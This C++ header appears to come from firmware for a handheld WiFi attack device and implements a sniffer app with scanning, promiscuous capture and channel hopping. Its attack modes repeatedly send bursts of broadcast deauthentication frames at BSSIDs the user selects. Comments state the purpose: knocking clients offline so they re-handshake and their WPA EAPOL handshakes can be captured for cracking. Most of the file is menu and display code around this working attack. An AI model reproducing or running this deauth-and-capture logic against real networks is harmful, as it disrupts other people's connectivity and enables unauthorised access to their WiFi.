#ifndef APP_WIFI_SNIFF_H
#define APP_WIFI_SNIFF_H

#include <vector>
#include "../src/NanoUI.h"
#include "wifi_hack_core.h"
#include "wifi_hack_sniffer.h"
#include "../packet-injection.h"  
#include "../NetManager.h"

// Exported by the installed AmebaD 3.1.9 wifi_promisc.c wrapper.
extern "C" unsigned char is_promisc_enabled(void);

// 底层原厂扫描的回调函数 (重命名防止与 Attack 模块冲突)
static volatile bool system_scan_complete_sniff = false;
static volatile uint16_t system_scan_count_sniff = 0;
static bool system_scan_accept_sniff = false;
static uintptr_t system_scan_session_sniff = 0;

static rtw_result_t system_scan_handler_sniff(rtw_scan_handler_result_t *scan_result) {
    if (!scan_result) return RTW_SUCCESS;

    taskENTER_CRITICAL();
    const bool accept = system_scan_accept_sniff &&
        scan_result->user_data == reinterpret_cast<void*>(system_scan_session_sniff);
    if (accept && scan_result->scan_complete != 0) {
        system_scan_accept_sniff = false;
        system_scan_complete_sniff = true;
    }
    taskEXIT_CRITICAL();
    if (!accept) return RTW_SUCCESS;

    if (scan_result->scan_complete != 0) {
        return RTW_SUCCESS;
    } else if (g_hackCtx) {
        rtw_scan_result_t *record = &scan_result->ap_details;

        // 限制数量防炸内存
        if (g_hackCtx->scanResults.size() >= 100) return RTW_SUCCESS;

        WiFiResult res;
        record->SSID.val[record->SSID.len] = 0; // 确保字符串结束
        res.ssid = String((const char*)record->SSID.val);

        if (res.ssid.length() == 0) res.ssid = "*HIDDEN*"; // 处理隐藏网络

        res.channel = record->channel;
        res.selected = false;
        memcpy(res.bssid, record->BSSID.octet, 6);

        // 去重逻辑
        for (auto &ap : g_hackCtx->scanResults) {
            if (memcmp(ap.bssid, res.bssid, 6) == 0) return RTW_SUCCESS;
        }

        g_hackCtx->scanResults.push_back(res);
        taskENTER_CRITICAL();
        system_scan_count_sniff++;
        taskEXIT_CRITICAL();
    }
    return RTW_SUCCESS;
}

class AppWifiSniffer : public Application {
private:
    enum UIState { STATE_MODE_SEL, STATE_LIVE_RADAR, STATE_MENU, STATE_EXEC, STATE_SCAN_DIAG };
    UIState state = STATE_MODE_SEL; 
    
    int scan_mode = 1; 
    int radarIndex = 0;  
    int radarOffset = 0;
    int menuIndex = 0;
    
    const char* menuItems[8] = { 
        "1. 单目标断连", "2. 多目标断连", "3. 静默监听",
        "4. 探测请求", "5. 信标帧", "6. 断连帧",
        "7. 伙伴设备", "8. 全部帧"
    };
    
    uint32_t lastAttackTick = 0;
    uint32_t anim_frame = 0; 
    
    // 核心状态变量：动态代表“开火间隔”或“静默跳频间隔”
    uint32_t currentTacticalInterval = 3000; // 默认3秒攻击间隔，保证重连抓包窗口
    
    int scan_channel_idx = 0;
    uint32_t scan_channel_timer = 0;
    int scanOnResult = -9;
    int scanPromiscResult = -9;
    int scanSetResult = -9;
    int scanGetResult = -9;
    int scanRequestedChannel = 1;
    int scanDriverChannel = 0;
    int scanPromiscEnabled = 0;
    uint32_t scan_diag_timer = 0;
    const char* scanFeedback = nullptr;

    std::vector<int> targetChannels; 

    void drawMarqueeText(Canvas* canvas, int x, int y, String text, uint32_t frame,
                         int width = 0, bool inverted = false) {
        if (width <= 0) width = 128 - x;
        const int overflow = get_utf8_string_width(text.c_str(), 8) - width;
        int offset = 0;
        if (overflow > 0) {
            const int tick = (frame / 5) % (overflow + 20);
            offset = tick > 10 ? tick - 10 : 0;
            if (offset > overflow) offset = overflow;
        }
        // 按像素滚动并裁剪，避免按字节截断中文 UTF-8 字符。
        ScopedClip clip(canvas, {NanoCoordinate(x), NanoCoordinate(y),
            NanoCoordinate(x + width), NanoCoordinate(y + 12)});
        canvas->drawText(x - offset, y, text.c_str(), 8, inverted);
    }

    void setChannel(int ch) {
        g_hackCtx->currentChannel = ch;
        wifi_set_channel(ch);
    }

    void refreshScanChannel() {
        // AmebaD 3.1.9 writes only the low byte through its int* API.
        int channel = 0;
        scanGetResult = wifi_get_channel(&channel);
        scanDriverChannel = scanGetResult == 0 ? channel : 0;
        scanPromiscEnabled = is_promisc_enabled();
        if (scanGetResult == 0) g_hackCtx->currentChannel = channel;
    }

    void setScanChannel(int channel) {
        scanRequestedChannel = channel;
        scanSetResult = wifi_set_channel(channel);
        refreshScanChannel();
        if (scanSetResult == 0 && scanGetResult != 0)
            g_hackCtx->currentChannel = channel;
    }

    void startScanCapture(bool resetResults) {
        scanFeedback = nullptr;
        wifiSniffRxEnd();
        wifi_off(); safe_delay(50);
        scanOnResult = wifi_on(RTW_MODE_PROMISC); safe_delay(50);
        if (resetResults) g_hackCtx->reset();
        scanPromiscResult = -9;
        scanPromiscEnabled = 0;
        scanSetResult = scanGetResult = -9;
        scanRequestedChannel = DEEP_SCAN_CHANNELS[scan_channel_idx];
        scanDriverChannel = 0;
        wifiSniffRxBegin();
        if (scanOnResult < 0) {
            g_hackCtx->currentMode = SNIFF_STOP;
            return;
        }
        wifi_enter_promisc_mode();
        g_hackCtx->currentMode = SNIFF_ALL;
        scanPromiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, master_promisc_callback, 1);
        setScanChannel(DEEP_SCAN_CHANNELS[scan_channel_idx]);
        scan_channel_timer = scan_diag_timer = hal_get_ticks();
    }

    void processHopping() {
        // 智能跳频：静默模式允许静默模式 200ms 轮询，主动模式 1000ms
        uint32_t hopDelay = currentTacticalInterval;
        if (menuIndex <= 1 && hopDelay < 1000) hopDelay = 1000; 
        if (menuIndex == 2 && hopDelay < 200) hopDelay = 200;

        if (g_hackCtx->isHopping && (hal_get_ticks() - g_hackCtx->lastHopTime >= hopDelay)) {
            if (!targetChannels.empty()) {
                g_hackCtx->currentChannelIndex = (g_hackCtx->currentChannelIndex + 1) % targetChannels.size();
                setChannel(targetChannels[g_hackCtx->currentChannelIndex]);
            }
            g_hackCtx->lastHopTime = hal_get_ticks();
            lastAttackTick = 0; // 保证跳到新信道后，主动模式能立刻发包
        }
    }

    // 原厂系统级扫描（带 UI 进度条与防卡死）
    bool performSystemScan(Canvas* canvas, InputDriver* input) {
        scanFeedback = nullptr;
        wifiSniffRxEnd();
        
        // 切回正常 STA 模式调用原厂扫描
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
        wifi_off(); safe_delay(50);
        g_hackCtx->scanResults.clear();
        const int onResult = wifi_on(RTW_MODE_STA);
        safe_delay(50);
        if (onResult < 0) {
            scanFeedback = "SCAN FAILED";
            return false;
        }

        taskENTER_CRITICAL();
        ++system_scan_session_sniff;
        if (system_scan_session_sniff == 0) ++system_scan_session_sniff;
        system_scan_complete_sniff = false;
        system_scan_count_sniff = 0;
        system_scan_accept_sniff = true;
        void* scanSession = reinterpret_cast<void*>(system_scan_session_sniff);
        taskEXIT_CRITICAL();
        if (wifi_scan_networks(system_scan_handler_sniff, scanSession) != RTW_SUCCESS) {
            taskENTER_CRITICAL();
            system_scan_accept_sniff = false;
            taskEXIT_CRITICAL();
            scanFeedback = "SCAN FAILED";
            return false; 
        }

        uint32_t start_ms = hal_get_ticks();
        while (true) {
            taskENTER_CRITICAL();
            const bool complete = system_scan_complete_sniff;
            taskEXIT_CRITICAL();
            if (complete) break;
            const UIEvent event = input->poll();
            if (event.type == EVT_BACK || !is_display_active ||
                hal_get_ticks() - start_ms >= 15000) {
                // Reject late reports before stopping the outstanding SDK scan.
                taskENTER_CRITICAL();
                system_scan_accept_sniff = false;
                taskEXIT_CRITICAL();
                scanFeedback = event.type == EVT_BACK ? "SCAN CANCEL" : "SCAN TIMEOUT";
                wifi_off();
                return false;
            }
            
            canvas->clear();
            canvas->fillRect(0, 0, 128, 16, C_WHITE);
            canvas->drawText(2, 2, "正在扫描网络", 8, true);

            const uint32_t elapsed_ms = hal_get_ticks() - start_ms;
            char buf[32];
            taskENTER_CRITICAL();
            const unsigned count = system_scan_count_sniff;
            taskEXIT_CRITICAL();
            snprintf(buf, sizeof(buf), "发现网络: %u", count);
            canvas->drawText(8, 27, buf, 8);
            
            canvas->drawRect(14, 40, 100, 8, C_WHITE);
            const int pulse_x = 14 + ((elapsed_ms / 25) % 84);
            canvas->fillRect(pulse_x, 42, 16, 4, C_WHITE);
            
            canvas->display();
            
            yield();
            safe_delay(20); 
        }

        // 手写轻量级排序，彻底抛弃 std::sort 避开 Ameba SDK 冲突
        size_t n = g_hackCtx->scanResults.size();
        for (size_t i = 0; i < n; i++) {
            for (size_t j = i + 1; j < n; j++) {
                if (g_hackCtx->scanResults[j].channel < g_hackCtx->scanResults[i].channel) {
                    WiFiResult temp = g_hackCtx->scanResults[i];
                    g_hackCtx->scanResults[i] = g_hackCtx->scanResults[j];
                    g_hackCtx->scanResults[j] = temp;
                }
            }
        }

        return true;
    }

public:
    const char* getAppName() override { return "无线抓包"; }
    AppMode getMode() override { return APP_MODE_EXCLUSIVE; } 

    void runExclusive(Canvas* canvas, InputDriver* input) override {
        AuditRelay::begin();
        init_eapol_queue(); 

        if (!g_hackCtx) g_hackCtx = new WifiHackContext();
        
        bool running = true;
        state = STATE_MODE_SEL;
        scan_mode = 1;
        char buf[32];
        
        uint32_t last_ui_draw = 0;

        while(running && is_display_active) {
            UIEvent e = input->poll();

            if (e.type == EVT_BACK) {
                if (state == STATE_EXEC || state == STATE_MENU) {
                    g_hackCtx->currentMode = SNIFF_ALL;
                    g_hackCtx->isHopping = false;
                    targetChannels.clear();
                    state = STATE_LIVE_RADAR;
                } else if (state == STATE_LIVE_RADAR || state == STATE_SCAN_DIAG) {
                    wifiSniffRxEnd();
                    g_hackCtx->currentMode = SNIFF_STOP;
                    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); 
                    wifi_off(); safe_delay(50);
                    wifi_on(RTW_MODE_STA); 
                    state = STATE_MODE_SEL;
                } else {
                    running = false;
                }
            }

            if (state == STATE_MODE_SEL) {
                if (e.type == EVT_DOWN || e.type == EVT_UP) scan_mode = 1 - scan_mode;
                if (e.type == EVT_OK) {
                    
                    if (scan_mode == 1) {
                        // 启用原厂非阻塞带 UI 的系统级扫描
                        if (!performSystemScan(canvas, input)) continue;
                        
                        // 扫描完后切回 PROMISC，为后续抓包和狙击做准备
                        scan_channel_idx = 0;
                        startScanCapture(false);
                    } else {
                        // Prefer a previously discovered AP's channel for the fixed-channel test.
                        const int channel = g_hackCtx->scanResults.empty() ? 1 :
                            g_hackCtx->scanResults.front().channel;
                        scan_channel_idx = 0;
                        for (int i = 0; i < NUM_DEEP_CHANNELS; ++i)
                            if (DEEP_SCAN_CHANNELS[i] == channel) scan_channel_idx = i;
                        startScanCapture(true);
                    }
                    
                    targetChannels.clear();
                    g_hackCtx->isHopping = false; 
                    radarIndex = 0; radarOffset = 0;
                    state = scan_mode == 0 || scanOnResult < 0 ||
                        scanPromiscResult != 0 || !scanPromiscEnabled ?
                        STATE_SCAN_DIAG : STATE_LIVE_RADAR;
                }
            }
            else if (state == STATE_SCAN_DIAG) {
                if (e.type == EVT_UP || e.type == EVT_DOWN) {
                    const int direction = e.type == EVT_DOWN ? 1 : -1;
                    scan_channel_idx = (scan_channel_idx + direction + NUM_DEEP_CHANNELS) % NUM_DEEP_CHANNELS;
                    if (scanOnResult >= 0 && scanPromiscResult == 0) {
                        wifiSniffRxEnd();
                        setScanChannel(DEEP_SCAN_CHANNELS[scan_channel_idx]);
                        wifiSniffRxBegin();
                    }
                }
                if (hal_get_ticks() - scan_diag_timer >= 250) {
                    if (scanOnResult >= 0) refreshScanChannel();
                    scan_diag_timer = hal_get_ticks();
                }
                if (e.type == EVT_OK && scanOnResult >= 0 &&
                    scanPromiscResult == 0 && scanPromiscEnabled) {
                    scan_channel_timer = hal_get_ticks();
                    state = STATE_LIVE_RADAR;
                }
            }
            else if (state == STATE_LIVE_RADAR) {
                // Keep sweeping channels while the result list is open. The system
                // scan provides the initial batch; passive capture fills in later APs.
                // Both entry paths share this non-blocking list sweep. Give each
                // 2.4/5 GHz channel two seconds to collect more beacons.
                const uint32_t current_dwell_time = 2000;

                if (hal_get_ticks() - scan_channel_timer > current_dwell_time) {
                    scan_channel_idx = (scan_channel_idx + 1) % NUM_DEEP_CHANNELS;
                    setScanChannel(DEEP_SCAN_CHANNELS[scan_channel_idx]);
                    scan_channel_timer = hal_get_ticks();
                }

                if (e.type == EVT_DOWN) { 
                    if ((size_t)radarIndex < g_hackCtx->scanResults.size()) radarIndex++; 
                    if (radarIndex >= radarOffset + 3) radarOffset = radarIndex - 2;
                }
                if (e.type == EVT_UP) { 
                    if (radarIndex > 0) radarIndex--; 
                    if (radarIndex < radarOffset) radarOffset = radarIndex; 
                }
                if (e.type == EVT_OK) { 
                    if (radarIndex == 0) state = STATE_MENU; 
                    else g_hackCtx->scanResults[radarIndex - 1].selected = !g_hackCtx->scanResults[radarIndex - 1].selected;
                }
            } 
            else if (state == STATE_MENU) {
                if (e.type == EVT_DOWN) { if (menuIndex < 7) menuIndex++; } 
                if (e.type == EVT_UP) { if (menuIndex > 0) menuIndex--; }
                if (e.type == EVT_OK) {
                    targetChannels.clear();
                    for (size_t i = 0; i < g_hackCtx->scanResults.size(); i++) {
                        if (g_hackCtx->scanResults[i].selected) {
                            bool exists = false;
                            for (size_t j = 0; j < targetChannels.size(); j++) {
                                if (targetChannels[j] == g_hackCtx->scanResults[i].channel) { exists = true; break; }
                            }
                            if (!exists) targetChannels.push_back(g_hackCtx->scanResults[i].channel);
                        }
                    }

                    g_hackCtx->txCount = 0; g_hackCtx->rxCount = 0;
                    g_hackCtx->intelLogs.clear();
                    
                    if (menuIndex <= 2 && targetChannels.empty()) g_hackCtx->addLog("全信道扫描");
                    else g_hackCtx->addLog("开始任务…");

                    // 单目标时锁定信道不跳频，避免漏抓
                    if (targetChannels.size() == 1) {
                        g_hackCtx->isHopping = false;
                        setChannel(targetChannels[0]);
                    } else {
                        g_hackCtx->isHopping = true;
                        if (targetChannels.empty()) {
                            for(int i=0; i<NUM_DEEP_CHANNELS; i++) targetChannels.push_back(DEEP_SCAN_CHANNELS[i]);
                        }
                    }

                    // 为不同模式赋初始最佳参数
                    if (menuIndex == 0 || menuIndex == 1) { 
                        g_hackCtx->currentMode = SNIFF_EAPOL; 
                        currentTacticalInterval = 3000; // 主动打击模式默认3秒
                    }
                    else if (menuIndex == 2) { 
                        g_hackCtx->currentMode = SNIFF_EAPOL; 
                        currentTacticalInterval = 400;  // 纯监听极速跳频
                    }
                    else if (menuIndex == 3) g_hackCtx->currentMode = SNIFF_PROBE;
                    else if (menuIndex == 4) g_hackCtx->currentMode = SNIFF_BEACON;
                    else if (menuIndex == 5) g_hackCtx->currentMode = SNIFF_DEAUTH;
                    else if (menuIndex == 6) g_hackCtx->currentMode = SNIFF_PWNAGOTCHI;
                    else if (menuIndex == 7) g_hackCtx->currentMode = SNIFF_ALL;
                    
                    lastAttackTick = hal_get_ticks();
                    state = STATE_EXEC;
                }
            }
            else if (state == STATE_EXEC) {
                // 多级参数控制逻辑
                if (menuIndex <= 2) {
                    if (e.type == EVT_UP) { 
                        if (menuIndex == 2) { 
                            if (currentTacticalInterval > 1000) currentTacticalInterval -= 500;
                            else if (currentTacticalInterval > 200) currentTacticalInterval -= 100;
                        } else { 
                            if (currentTacticalInterval > 5000) currentTacticalInterval -= 1000;
                            else if (currentTacticalInterval > 1000) currentTacticalInterval -= 500; // 允许压到1秒
                        }
                    }
                    if (e.type == EVT_DOWN) { 
                        if (menuIndex == 2) {
                            if (currentTacticalInterval < 1000) currentTacticalInterval += 100;
                            else if (currentTacticalInterval < 5000) currentTacticalInterval += 500;
                        } else {
                            if (currentTacticalInterval < 15000) currentTacticalInterval += 1000;
                        }
                    }
                }

                processHopping();

                // 针对 Sniper/Auto-Pwn 的高频发送逻辑
                if (menuIndex <= 1 && (hal_get_ticks() - lastAttackTick > currentTacticalInterval)) {
                    if (!targetChannels.empty()) {
                        for (size_t i = 0; i < g_hackCtx->scanResults.size(); i++) {
                            WiFiResult &t = g_hackCtx->scanResults[i];
                            if (t.selected && t.channel == g_hackCtx->currentChannel) {
                                // 连发 15 个帧，逐次无延迟发送，逼使对方重新握手
                                wifi_tx_broadcast_deauth(t.bssid, 0x02, 15, 0); 
                                g_hackCtx->txCount += 15; 
                            }
                        }
                    }
                    lastAttackTick = hal_get_ticks();
                }
            }

            process_raw_eapol_queue(); 

            AuditRelay::tick();

            uint32_t ui_throttle_ms = (state == STATE_EXEC) ? ((currentTacticalInterval < 500 && menuIndex == 2) ? 80 : 100) : 30;

            if (hal_get_ticks() - last_ui_draw > ui_throttle_ms) {
                last_ui_draw = hal_get_ticks();
                anim_frame++; 
                
                canvas->clear();
                
                if (state == STATE_MODE_SEL) {
                    canvas->fillRect(0, 0, 128, 16, C_WHITE);
                    canvas->drawText(2, 2, "选择扫描方式", 8, true);
                    if (scan_mode == 0) canvas->fillRect(0, 19, 128, 14, C_WHITE);
                    else canvas->fillRect(0, 35, 128, 14, C_WHITE);
                    canvas->drawText(6, 20, "1. 被动监听", 8, scan_mode == 0);
                    canvas->drawText(6, 36, "2. 系统扫描", 8, scan_mode == 1);
                    canvas->drawLine(0, 50, 127, 50, C_WHITE);
                    canvas->drawText(4, 52, scanFeedback ? scanFeedback : "确认键开始", 8, false);
                }
                else if (state == STATE_LIVE_RADAR) {
                    canvas->fillRect(0, 0, 128, 16, C_WHITE);
                    snprintf(buf, sizeof(buf), "信道:%d 网络:%d",
                             g_hackCtx->currentChannel, (int)g_hackCtx->scanResults.size());
                    canvas->drawText(2, 2, buf, 8, true);
                    for (int i = 0; i < 3; i++) {
                        const int dataIdx = radarOffset + i;
                        if ((size_t)dataIdx > g_hackCtx->scanResults.size()) break;
                        const int y = 18 + i * 16;
                        const bool selected = radarIndex == dataIdx;
                        if (selected) canvas->fillRect(0, y - 1, 124, 14, C_WHITE);
                        if (dataIdx == 0) {
                            canvas->drawText(10, y, "[ 开始任务 ]", 8, selected);
                        } else {
                            WiFiResult &res = g_hackCtx->scanResults[dataIdx - 1];
                            // Keep UTF-8 intact; clip/scroll within the SSID slot.
                            String msg = String(res.selected ? "[X] " : "[ ] ") + res.ssid;
                            drawMarqueeText(canvas, 2, y, msg, anim_frame, 98, selected);
                            snprintf(buf, sizeof(buf), "%d", res.channel);
                            canvas->drawText(103, y + 2, buf, 8, selected);
                        }
                    }
                    if (g_hackCtx->scanResults.size() > 2) {
                        int barY = map(radarIndex, 0, g_hackCtx->scanResults.size(), 18, 58);
                        canvas->drawLine(126, 18, 126, 61, C_WHITE);
                        canvas->fillRect(125, barY, 3, 4, C_WHITE);
                    }
                }
                else if (state == STATE_SCAN_DIAG) {
                    canvas->fillRect(0, 0, 128, 16, C_WHITE);
                    canvas->drawText(2, 2, "接收诊断", 8, true);
                    snprintf(buf, sizeof(buf), "M:%d", (int)g_hackCtx->currentMode);
                    canvas->drawText(100, 2, buf, 8, true);
                    if ((anim_frame / 80) % 2 == 0) {
                        snprintf(buf, sizeof(buf), "ON:%d PM:%d E:%d",
                                 scanOnResult, scanPromiscResult, scanPromiscEnabled);
                        canvas->drawText(2, 19, buf, 8);
                        snprintf(buf, sizeof(buf), "CH:%d/%d S:%d G:%d",
                                 scanRequestedChannel, scanDriverChannel, scanSetResult, scanGetResult);
                        canvas->drawText(2, 35, buf, 8);
                    } else {
                        const WifiSniffRxSnapshot rx = wifiSniffRxSnapshot();
                        snprintf(buf, sizeof(buf), "CB:%lu RX:%lu",
                                 (unsigned long)(rx.callbacks > 99999 ? 99999 : rx.callbacks),
                                 (unsigned long)(rx.frames > 99999 ? 99999 : rx.frames));
                        canvas->drawText(2, 19, buf, 8);
                        snprintf(buf, sizeof(buf), "B:%lu P:%lu A:%lu",
                                 (unsigned long)(rx.beacons > 9999 ? 9999 : rx.beacons),
                                 (unsigned long)(rx.probeResponses > 9999 ? 9999 : rx.probeResponses),
                                 (unsigned long)(rx.added > 999 ? 999 : rx.added));
                        canvas->drawText(2, 35, buf, 8);
                    }
                    canvas->drawText(2, 52, scanOnResult < 0 || scanPromiscResult != 0 ||
                        !scanPromiscEnabled ? "BACK RETRY" : "UP/DN CH OK LIST", 8);
                }
                else if (state == STATE_MENU) {
                    canvas->fillRect(0, 0, 128, 16, C_WHITE);
                    canvas->drawText(2, 2, "选择任务", 8, true);
                    const int mOffset = menuIndex >= 3 ? menuIndex - 2 : 0;
                    for (int i = 0; i < 3; i++) {
                        const int dIdx = mOffset + i;
                        if (dIdx >= 8) break;
                        const int y = 18 + i * 16;
                        if (menuIndex == dIdx) canvas->fillRect(0, y - 1, 122, 14, C_WHITE);
                        canvas->drawText(6, y, menuItems[dIdx], 8, menuIndex == dIdx);
                    }
                    canvas->drawLine(125, 18, 125, 61, C_WHITE);
                    canvas->fillRect(124, 18 + menuIndex * 34 / 7, 3, 10, C_WHITE);
                }
                else if (state == STATE_EXEC) {
                    canvas->fillRect(0, 0, 128, 14, C_WHITE);
                    String title = String(menuItems[menuIndex]);
                    if (!g_hackCtx->isHopping) title += " [锁定]";
                    else if (targetChannels.size() > 1) title += " [轮换]";
                    else title += " [全频]";
                    drawMarqueeText(canvas, 2, 1, title, anim_frame, 124, true);

                    // Two readable log rows; alternate the window when three
                    // retained records exist. Only presentation is paged.
                    const size_t firstLog = g_hackCtx->intelLogs.size() > 2
                        ? (anim_frame / 80) % 2 : 0;
                    for (size_t i = firstLog; i < g_hackCtx->intelLogs.size() && i < firstLog + 2; i++)
                        drawMarqueeText(canvas, 2, 16 + (i - firstLog) * 12,
                                        g_hackCtx->intelLogs[i], anim_frame + i * 15);
                    canvas->drawLine(0, 40, 127, 40, C_WHITE);

                    // Compact counters stay ASCII; Chinese instructions use12px.
                    snprintf(buf, sizeof(buf), "CH:%d", g_hackCtx->currentChannel);
                    canvas->drawTextInRect(2, 42, 37, 8, buf, 0, 8);
                    snprintf(buf, sizeof(buf), "TX:%lu", (unsigned long)g_hackCtx->txCount);
                    canvas->drawTextInRect(41, 42, 39, 8, buf, 0, 8);
                    snprintf(buf, sizeof(buf), "RX:%lu", (unsigned long)g_hackCtx->rxCount);
                    canvas->drawTextInRect(82, 42, 46, 8, buf, 0, 8);
                    if (menuIndex == 2 && !g_hackCtx->isHopping)
                        snprintf(buf, sizeof(buf), "返回 信道已锁定");
                    else if (menuIndex <= 2)
                        snprintf(buf, sizeof(buf), menuIndex == 2 ? "返回 跳频%lums" : "返回 间隔%lums",
                                 (unsigned long)currentTacticalInterval);
                    else snprintf(buf, sizeof(buf), "返回键停止任务");
                    drawMarqueeText(canvas, 2, 52, String(buf), anim_frame);
                }
                
                canvas->display(); 
            }

            yield(); 
            safe_delay(1); 
        }
        
        wifiSniffRxEnd();
        g_hackCtx->currentMode = SNIFF_STOP;
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); 
        wifi_off(); safe_delay(50);
        wifi_on(RTW_MODE_STA); 
        
        free_eapol_queue(); 
    }
};

#endif
